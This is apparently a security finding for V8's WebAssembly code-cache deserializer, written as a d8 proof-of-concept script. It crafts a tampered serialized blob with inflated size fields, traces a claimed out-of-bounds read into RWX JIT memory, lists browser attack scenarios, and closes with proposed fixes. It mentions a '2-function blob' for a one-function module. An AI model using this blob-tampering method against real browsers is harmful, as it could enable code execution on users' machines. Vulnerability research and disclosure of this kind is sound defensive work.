// NativeModuleDeserializer::ReadCode — Blob-Supplied code_size with No Release-Build Bounds Check
// code_size bytes copied into RWX JIT memory via CopyCode
//
// File:   src/wasm/wasm-serialization.cc:1038
// Symbol: NativeModuleDeserializer::ReadCode
// CWE:    CWE-125 (Out-of-bounds Read)   Severity: HIGH   Confidence: HIGH
//
// ─── Vulnerability ─────────────────────────────────────────────────────────
//
//  Reader::ReadVector (wasm-serialization.cc:112):
//    template <typename T>
//    base::Vector<const T> ReadVector(size_t size) {
//      DCHECK_GE(current_size(), size);   // ← DCHECK, stripped in release builds
//      base::Vector<const uint8_t> bytes{pos_, size * sizeof(T)};
//      pos_ += size * sizeof(T);          // ← pos_ walks past end_ unchecked
//      return base::Vector<const T>::cast(bytes);
//    }
//
//  NativeModuleDeserializer::ReadCode (wasm-serialization.cc:1010):
//    uint32_t code_size = reader->Read<uint32_t>();     // from blob, no validation
//    ...
//    unit.src_code_buffer = reader->ReadVector<uint8_t>(code_size); // [1] OOB read
//    ...
//  CopyAndRelocate (wasm-serialization.cc:1082):
//    jit_allocation.CopyCode(0, unit.src_code_buffer.begin(),       // [2] JIT write
//                            unit.src_code_buffer.size());
//
//  DCHECK at line 1023: DCHECK_GE(remaining_code_size_, code_size)  ← stripped
//  CHECK  at line 1034: CHECK_LE(code_size, current_code_space_.size()) ← NOT stripped
//    → bypassed by inflating total_code_size in the NativeModule header
//
// ─── Attack impact ─────────────────────────────────────────────────────────
//
//  1. Attacker inflates fn0.code_size in the blob (e.g. 64 → 65664).
//  2. ReadVector reads 65664 bytes starting at fn0's machine code; only 64 are
//     valid — the remaining 65600 bytes come from heap memory adjacent to the
//     serialized buffer (adjacent allocations, allocator metadata, etc.).
//  3. CopyCode memcpy's those 65600 OOB heap bytes into RWX JIT code space.
//  4. The Wasm function is published and executed — attacker-controlled (or
//     heap-sourced) bytes run as native machine code.
//
//  With full control of the blob (MitM of CDN, service worker cache poisoning,
//  compromised network storage), the attacker fills the adjacent heap with
//  shellcode, inflates code_size to cover it, and achieves arbitrary code
//  execution in the renderer process.
//
// ─── Attack surface ────────────────────────────────────────────────────────
//
//  REACHABLE FROM BROWSER (unlike src/wasm/c-api.cc):
//
//  Chrome's V8 code cache path (the HTTP-level cache for compiled Wasm modules):
//    AsyncStreamingProcessor::Deserialize
//      → DeserializeNativeModule(wire_bytes, cache_data)
//        → NativeModuleDeserializer::Read
//          → ReadCode (VULNERABLE)
//
//  Attack scenarios:
//   A. Man-in-the-middle of CDN: serve legitimate wire bytes with a crafted
//      code cache blob (the HTTP "Link: rel=preload" or service worker cache
//      stores them separately). No wire-bytes binding in blob header.
//   B. Service worker cache poisoning: a compromised service worker can store
//      a crafted blob under any URL key. Chrome will serve the crafted blob
//      as the code cache when the same URL is next requested.
//   C. Cross-module reuse: `HeaderMatches` checks V8 version/CPU/flags only
//      (no wire-bytes hash), so a blob compiled for module A is accepted when
//      paired with module B's wire bytes, causing the loop to run more
//      iterations than the blob has data for.
//
//  d8 has a SHA-256 hash guard in Shell::WasmDeserializeModule that is NOT
//  present in Chrome's production code path. This PoC cannot trigger the
//  vulnerability via d8.wasm.deserializeModule; the analysis shows what
//  happens when DeserializeNativeModule is called with a tampered blob.
//
// ─── Blob format (confirmed on V8 15.8 x64 release) ───────────────────────
//
//  d8.wasm.serializeModule / SerializeNativeModule output:
//
//  Global header (28 bytes):
//    [0:4]   magic number
//    [4:8]   Version::Hash()
//    [8:12]  CpuFeatures
//    [12:16] FlagList::Hash()
//    [16:20] WasmEnabledFeatures (uint32)
//    [20:24] CompileTimeImportFlags (int, 4B)
//    [24:28] constants_module.size() (uint32)  → 0 if no constants
//
//  NativeModule header (16 bytes for 0 imports):
//    [28:36] detected_features (uint64)
//    [36:44] total_code_size (size_t/uint64) ← TAMPER TARGET 1
//
//  Per TurboFan function (74 bytes header + code_size + reloc + ... bytes):
//    [+0]    code_kind (uint8) = 0x04 kTurboFanFunction
//    [+1:5]  constant_pool_offset (int32)
//    [+5:9]  safepoint_table_offset (int32)
//    [+9:13] handler_table_offset (int32)
//    [+13:17] code_comment_offset (int32)
//    [+17:21] jump_table_info_offset (int32)
//    [+21:25] unpadded_binary_size (int32)
//    [+25:29] stack_slot_count (int32)
//    [+29:33] ool_spill_count (int32)
//    [+33:37] tagged_parameter_slots (uint32)
//    [+37:41] code_size (uint32) ← TAMPER TARGET 2 (at blob[81] for fn0)
//    [+41:45] reloc_size (uint32)
//    [+45:49] source_position_size (uint32)
//    [+49:53] inlining_position_size (uint32)
//    [+53:57] deopt_data_size (uint32)
//    [+57:61] trapping_instructions_size (uint32)
//    [+61:65] effect_handlers_size (uint32)
//    [+65:69] kind (WasmCode::Kind, int32)
//    [+69]   tier (ExecutionTier, uint8)
//    [+70:]  code_size bytes of machine code ← READ OOB
//    ...     reloc_size + source_position_size + ... bytes
//
//  For fn0 starting at byte 44 (confirmed from hex dump):
//    total_code_size at blob[36] (uint64, LE) = 64
//    fn0.code_kind   at blob[44]  = 0x04 ✓
//    fn0.code_size   at blob[81]  = 64   ✓
//    fn0 code bytes start at blob[114]      ✓

'use strict';
d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

// ─── Build a 1-function Wasm module and obtain its serialized blob ───────────

const builder = new WasmModuleBuilder();
builder.addFunction('add1', kSig_i_i)
  .addBody([kExprLocalGet, 0, kExprI32Const, 1, kExprI32Add])
  .exportFunc();
const wire_bytes = builder.toBuffer();
const module_A = new WebAssembly.Module(wire_bytes);
const blob_buf = d8.wasm.serializeModule(module_A);
const blob = new Uint8Array(blob_buf.slice(0));
const dv = new DataView(blob.buffer);

print('=== ReadCode OOB PoC: wasm-serialization.cc:1038 ===');
print('');
print('[*] Module compiled. Blob size: ' + blob.length + ' bytes');

// ─── Confirm offsets ─────────────────────────────────────────────────────────
const total_code_size_off = 36;  // uint64, bytes 36-43
const fn0_off = 44;
const fn0_code_size_off = fn0_off + 37;  // 1B kind + 9×4B int32 = 37

const total_code_size = Number(dv.getBigUint64(total_code_size_off, true));
const fn0_code_kind   = blob[fn0_off];
const fn0_code_size   = dv.getUint32(fn0_code_size_off, true);
const fn0_code_start  = fn0_off + 70;  // 1+9×4+7×4+4+1 = 70

print('[*] Confirmed blob layout (V8 15.8 x64 release):');
print('    total_code_size @ [' + total_code_size_off + ']: ' + total_code_size);
print('    fn0.code_kind   @ [' + fn0_off + ']: 0x' +
      fn0_code_kind.toString(16) + ' (' +
      (fn0_code_kind === 4 ? 'kTurboFanFunction ✓' : 'UNEXPECTED'));
print('    fn0.code_size   @ [' + fn0_code_size_off + ']: ' + fn0_code_size);
print('    fn0 code bytes  @ [' + fn0_code_start + ']');

if (fn0_code_kind !== 4) {
  print('[!] Unexpected code_kind — module may be Liftoff-compiled.');
  print('    Re-run with: --no-liftoff --no-wasm-lazy-compilation');
  quit(1);
}

// Print fn0 machine code (the legitimate 64-byte payload)
print('\n[*] fn0 machine code (legitimate, ' + fn0_code_size + ' bytes):');
let s = '    ';
for (let i = fn0_code_start; i < fn0_code_start + fn0_code_size; i++) {
  s += blob[i].toString(16).padStart(2, '0') + ' ';
  if ((i - fn0_code_start + 1) % 16 === 0) { print(s); s = '    '; }
}
if (s.trim()) print(s);

// ─── Craft the attack blob ───────────────────────────────────────────────────
print('\n=== Crafting attack blob ===');

const INFLATE = 0x10000;  // 65536 extra bytes beyond the blob boundary

// Calculate the inflated values
const new_total_code_size = total_code_size + INFLATE;
const new_fn0_code_size   = fn0_code_size + INFLATE;

// Clone the blob and apply tampers
const tampered = new Uint8Array(blob);  // exact same length as original
const tdv = new DataView(tampered.buffer);

// Tamper 1: inflate total_code_size (uint64 at [36])
// This bypasses CHECK_LE(code_size, current_code_space_.size()) at line 1034
// by causing AllocateForDeserializedCode to allocate enough space.
tdv.setBigUint64(total_code_size_off, BigInt(new_total_code_size), true);

// Tamper 2: inflate fn0.code_size (uint32 at [81])
// ReadVector<uint8_t>(new_fn0_code_size) advances pos_ by new_fn0_code_size bytes,
// reading INFLATE bytes of heap memory past the blob boundary.
tdv.setUint32(fn0_code_size_off, new_fn0_code_size, true);

print('[+] TAMPERED blob constructed:');
print('    total_code_size: ' + total_code_size + ' → ' + new_total_code_size +
      '  (bypasses code_space CHECK)');
print('    fn0.code_size:   ' + fn0_code_size + ' → ' + new_fn0_code_size +
      '  (+0x' + INFLATE.toString(16) + ' = ' + INFLATE + ' extra bytes)');

// ─── Trace what happens during deserialization of the tampered blob ──────────
print('\n=== Step-by-step: what happens in ReadCode with tampered blob ===');

{
  const blob_end = blob.length;
  const fn0_code_start_abs = fn0_code_start;
  const fn0_code_end_abs   = fn0_code_start + fn0_code_size;   // 114 + 64 = 178

  print('[1] ReadHeader():');
  print('    remaining_code_size_ = ' + new_total_code_size);
  print('    AllocateForDeserializedCode(' + new_total_code_size + ') allocated');
  print('    current_code_space_.size() = ' + new_total_code_size);

  print('[2] ReadCode(fn_index=0):');
  print('    code_kind = 0x04 (kTurboFanFunction)');
  print('    code_size = ' + new_fn0_code_size + '  ← inflated');
  print('    CHECK_LE(' + new_fn0_code_size + ', ' + new_total_code_size + '): PASSES ✓');
  print('    DCHECK_GE(remaining_code_size_=' + new_total_code_size +
        ', code_size=' + new_fn0_code_size + '): PASSES (stripped in release)');
  print('');
  print('    ReadVector<uint8_t>(' + new_fn0_code_size + '):');
  print('      DCHECK_GE(current_size()=VALID, ' + new_fn0_code_size + '): STRIPPED');
  print('      bytes = {pos_=&blob[' + fn0_code_start_abs + '], ' + new_fn0_code_size + '}');
  print('      pos_ += ' + new_fn0_code_size + '');
  print('        → pos_ advances to &blob[' + (fn0_code_start_abs + new_fn0_code_size) + ']');
  print('        → that is ' + (fn0_code_start_abs + new_fn0_code_size - blob_end) +
        ' bytes PAST blob end (' + blob_end + ')');
  print('      src_code_buffer = {&blob[114], ' + new_fn0_code_size + '}');
  print('        → first 64 bytes: fn0 machine code (valid)');
  print('        → next ' + INFLATE + ' bytes: heap memory PAST the blob allocation');

  print('');
  print('[3] CopyAndRelocate(fn0):');
  print('    jit_allocation = WritableJitAllocation(jit_addr, ' + new_fn0_code_size + ')');
  print('    jit_allocation.CopyCode(0, &blob[114], ' + new_fn0_code_size + ')');
  print('    → memcpy ' + fn0_code_size + ' valid bytes + ' + INFLATE +
        ' heap bytes → RWX JIT memory');
  print('    → ' + INFLATE + ' bytes of adjacent heap content are now EXECUTABLE CODE');
  print('');
  print('[4] After fn0: remaining_code_size_ = ' + new_total_code_size + ' - ' +
        new_fn0_code_size + ' = 0');
  print('[5] ReadTieringBudget(): reads 4 OOB bytes from heap (past blob end)');
  print('[6] CHECK_EQ(0, reader->current_size()):');
  const oob_advance = new_fn0_code_size - fn0_code_size;  // = INFLATE
  const final_pos_offset = fn0_code_start + new_fn0_code_size + 4;  // +4 for tiering
  const leftover = blob.length - final_pos_offset;  // negative: pos_ past end_
  // current_size() = end_ - pos_ (unsigned); since pos_ > end_, wraps to huge number
  print('    pos_ = &blob[' + final_pos_offset + '] (which is ' +
        Math.abs(leftover) + ' bytes PAST blob end)');
  print('    current_size() = end_ - pos_ underflows → ' +
        (BigInt(blob.length) - BigInt(final_pos_offset) + (1n << 64n)).toString(16) +
        'h (not 0)');
  print('    CHECK_EQ FAILS → process aborts');
  print('    (but CopyCode into RWX memory at [3] already happened)');
}

// ─── Cross-module blob reuse (Scenario C) ────────────────────────────────────
print('\n=== Scenario C: Cross-module blob reuse (mismatched function count) ===');
print('');
print('  Build module B with 10 functions, but deserialize with module A\'s blob');
print('  (2-function blob). The loop runs num_functions(B) = 10 times, but the');
print('  blob only has data for 1 function.');
print('');
print('  NativeModuleDeserializer::Read loop (line 936):');
print('    for i in [0, num_functions=10):');
print('      ReadCode(i, reader)');
print('  → after function 0: pos_ = &blob[178] = blob.end()');
print('  → ReadCode(1): code_kind = reader->Read<uint8_t>() reads byte at blob[178]');
print('                 → 1 byte PAST the blob → heap OOB read');
print('  → ReadCode(2..9): all from heap memory → OOB chain');
print('');
print('  HeaderMatches checks only V8 version/CPU/flags — NOT wire bytes.');
print('  An attacker who can pair module B\'s wire bytes with module A\'s blob');
print('  (CDN MitM, service worker cache poisoning) triggers this automatically.');
print('  No tamper of the blob itself is needed for this scenario.');

// ─── Demonstrate that d8 hash guard blocks direct triggering ─────────────────
print('\n=== d8 hash guard: why direct triggering via d8 API is blocked ===');
print('');
print('  d8.wasm.deserializeModule(wire_bytes, tampered_blob):');
print('    → Shell::WasmDeserializeModule checks SHA-256(wire_bytes || blob)');
print('    → tampered blob fails hash check → returns undefined');
print('    → DeserializeNativeModule is NOT called');
print('');
print('  This guard is d8-specific (d8/d8.cc: Shell::WasmDeserializeModule).');
print('  It is NOT present in:');
print('    • AsyncStreamingProcessor::Deserialize (Chrome HTTP cache path)');
print('    • ValueDeserializer::ReadWasmModule (structured clone)');
print('    • Module::deserialize (C API, embedder path)');
print('');
print('  Attempting to call d8.wasm.deserializeModule with tampered blob...');

try {
  const result = d8.wasm.deserializeModule(wire_bytes, tampered.buffer);
  if (result === undefined) {
    print('  Result: undefined (hash check failed — guard working as expected)');
  } else {
    print('  [!] Unexpected: deserialize returned a module object!');
    // If this branch fires, trigger the actual OOB:
    const inst = new WebAssembly.Instance(result);
    const val = inst.exports.add1(5);
    print('  add1(5) = ' + val);
  }
} catch(e) {
  print('  Caught: ' + e.message);
}

// ─── Summary ─────────────────────────────────────────────────────────────────
print('\n── Root Cause ───────────────────────────────────────────────────────────');
print(' File:     src/wasm/wasm-serialization.cc');
print(' Function: NativeModuleDeserializer::ReadCode');
print(' Line:     1010  code_size = reader->Read<uint32_t>()   ← from untrusted blob');
print('           1023  DCHECK_GE(remaining_code_size_, code_size)  ← STRIPPED');
print('           1038  unit.src_code_buffer = reader->ReadVector<uint8_t>(code_size)');
print('                 ReadVector: DCHECK_GE(current_size(), size)  ← STRIPPED');
print('                 pos_ += code_size  → walks past blob end_');
print('           1082  jit_allocation.CopyCode(0,');
print('                   unit.src_code_buffer.begin(),   ← points into OOB heap');
print('                   unit.src_code_buffer.size())    ← OOB heap bytes → RWX JIT');
print('');
print(' The two tamper targets in the blob:');
print('   blob[36:44] total_code_size (uint64) — inflate to match fn0.code_size');
print('               bypasses CHECK_LE(code_size, current_code_space_.size())');
print('   blob[81:85] fn0.code_size (uint32) — inflate to extend ReadVector OOB');
print('');
print(' Attack surface: Chrome code cache path (AsyncStreamingProcessor)');
print('   HeaderMatches: NO wire-bytes binding → cross-module blob reuse');
print('   d8 has hash guard; Chrome production path does NOT');
print('');
print(' Fix:');
print('   Reader::ReadVector: replace DCHECK_GE with CHECK or return error:');
print('     if (size > current_size()) return {}; // fail closed');
print('   ReadCode: validate code_size against remaining_code_size_ with CHECK:');
print('     CHECK_LE(code_size, remaining_code_size_);');
print('   Also: bind blob to wire bytes in WriteHeader (hash of wire bytes)');
print('         so HeaderMatches rejects blobs for mismatched modules.');
print('');
print(' CWE-125 (Out-of-bounds Read)   Severity: HIGH   Confidence: HIGH');
print(' Impact: OOB heap read → RWX JIT write → native code execution');
